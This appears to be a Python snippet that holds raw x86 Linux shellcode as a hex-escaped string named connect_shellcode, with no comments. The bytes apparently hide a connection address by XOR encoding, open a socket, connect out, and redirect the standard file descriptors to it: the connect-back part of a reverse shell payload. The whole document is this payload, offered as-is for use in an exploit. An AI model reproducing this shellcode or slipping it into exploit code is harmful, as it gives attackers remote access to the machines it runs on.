connect_shellcode = ""
connect_shellcode += "\xb8\x6e\x11\x11\x10\x35\x11\x11\x11\x11\x50\xb8\x13\x11\x15\xc3"
connect_shellcode += "\x35\x11\x11\x11\x11\x50\x89\xe6\x31\xc0\x50\xb0\x66\x31\xdb\x43"
connect_shellcode += "\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x31\xdb"
connect_shellcode += "\xb3\x03\x6a\x10\x56\x57\x89\xe1\xcd\x80\x31\xc9\x39\xc8\x75\x10"
connect_shellcode += "\x31\xc0\xb0\x3f\x89\xfb\xcd\x80\x41\x83\xf9\x04\x75\xf2\xeb\x07"
connect_shellcode += "\x31\xdb\x31\xc0\x40\xcd\x80"
